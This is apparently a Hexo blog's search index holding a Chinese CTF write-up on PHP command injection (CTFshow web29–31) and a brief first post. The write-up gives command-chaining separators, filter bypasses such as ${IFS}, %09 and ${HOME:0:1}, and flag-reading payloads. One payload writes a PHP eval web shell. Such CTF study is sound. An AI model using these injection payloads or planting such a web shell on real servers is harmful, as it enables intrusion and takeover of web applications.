<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>EZrce</title>
      <link href="/2024/06/03/EZrce/"/>
      <url>/2024/06/03/EZrce/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><h4 id="用于命令执行的常用函数"><a href="#用于命令执行的常用函数" class="headerlink" title="用于命令执行的常用函数"></a>用于命令执行的常用函数</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><h4 id="一些常见的绕过方式"><a href="#一些常见的绕过方式" class="headerlink" title="一些常见的绕过方式"></a>一些常见的绕过方式</h4><h5 id="Windows支持："><a href="#Windows支持：" class="headerlink" title="Windows支持："></a>Windows支持：</h5><p>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的 ，前面为假 ping 2||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%1a 作为.bat文件的命令分隔符</p><h5 id="Linux支持"><a href="#Linux支持" class="headerlink" title="Linux支持:"></a>Linux支持:</h5><p>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>|管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%0d 换行</p><h5 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h5><p>使用&lt;代替空格</p><p>使用${IFS}代替空格</p><blockquote><p>IFS变量的相关信息：</p><ul><li>Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。</li><li>如果IFS没有设置，或者IFS的值被设置为”\t\n”(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。</li><li>如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。</li><li>IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。</li><li>如果IFS为空(“null”)，则不会进行单词分割。</li></ul></blockquote><p>使用$IFS代替空格</p><h5 id="过滤斜杠-绕过"><a href="#过滤斜杠-绕过" class="headerlink" title="过滤斜杠&#x2F;绕过"></a>过滤斜杠&#x2F;绕过</h5><p>使用${HOME:0:1}代替</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>只是过滤了简单的flag字符，直接使用system函数</p><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、用egrep效果一样egrep=grep  -E</span><br><span class="line">c=system(&quot;cat fl*g.php | grep  -E &#x27;fl.g&#x27; &quot;);</span><br><span class="line">2、此种方式需要右键源代码</span><br><span class="line">c=system(&quot;cat fl*g.php&quot;);</span><br><span class="line">3、</span><br><span class="line">c=system(&quot;tac fl*g.php&quot;);</span><br><span class="line">4、倒序输出文本</span><br><span class="line">c=system(&quot;tac fl*g.php&quot;);</span><br><span class="line">5、</span><br><span class="line">c=system(&quot;cp fl*g.php a.txt &quot;);</span><br><span class="line">访问/a.txt</span><br><span class="line">6、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码</span><br><span class="line">c=system(&#x27;echo -e &quot; &lt;?php \n error_reporting(0); \n  \$c= \$_GET[\&#x27;c\&#x27;]; \n eval(\$c); &quot; &gt; a.php&#x27;);</span><br><span class="line">/a.php?c=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>过滤了system函数，可以用反引号来命令执行</p><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、nl命令，带着行号输出文本内容</span><br><span class="line">c=echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br><span class="line">echo `cat fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br><span class="line">echo `cat fl*ag.p*hp`;</span><br><span class="line">echo `cp fl*ag.p*hp 1.txt | cat 1.txt`;</span><br><span class="line">单引号：引号里面的内容会原封不动的显示出来（很简单，不做解释）</span><br><span class="line">双引号：里面的特殊符号会被解析，变量也会被替换（\ 符号、空格会被解析）</span><br><span class="line">echo /a -&gt; a</span><br><span class="line">echo &quot;/a&quot; -&gt; /a</span><br><span class="line">2、passthru函数，同system，同理exec，shell_exec也可以用，不过有点麻烦</span><br><span class="line">c=passthru(&quot;cat fla*&quot;);</span><br><span class="line">c=exec(passthru(&quot;cat fla*&quot;));</span><br><span class="line">c=shell_exec(passthru(&quot;cat fla*&quot;));</span><br></pre></td></tr></table></figure><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>题目过滤了空格，单引号，小数点，</p><p>过滤了空格，可以使用%09替代；也可以使用{$IFS}，因为单引号被过滤了，所以如果使用c&#x3D;passthru(“cat%09fla*”);或者{$IFS}都不会被解释为空格</p><p>所以构造如下Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、使用eval嵌套。具体参数：passthru 结合%09，也可以直接rce，因为没有对其他参数进行过滤</span><br><span class="line">其中%09绕过空格 ?c=eval($_GET[1]);&amp;1=passthru(&quot;tac%09fla*&quot;); 这里需要注意括号的闭合，&amp;的连接。</span><br><span class="line">2、使用参数：passthru结合 $IFS$9</span><br><span class="line">其中$IFS$9绕过空格，注意转义$符号 ?</span><br><span class="line">$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。c=eval($_GET[1]);&amp;1=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br><span class="line">3、使用未被过滤的命令。passthru直接读取</span><br><span class="line">?c=passthru(%22tac$IFS$9fla*%22); 也就是passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br><span class="line">4、使用pos(localeconv)来获取小数点</span><br><span class="line">localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c=print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rce, CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/05/17/hello-world/"/>
      <url>/2024/05/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>其实搭建blog之前，我有在公众号里写点一些碎碎念的东西，不过感觉废话太多？</p><p>所以刚刚写了好多又全删掉了</p><p>总的来说，试了很多错，但总算现在成功搞好咯，还算不错吧哈哈哈😎</p><p>耶耶耶(๑&gt;ᴗ&lt;๑)</p><p>希望会坚持更新吧🤗</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
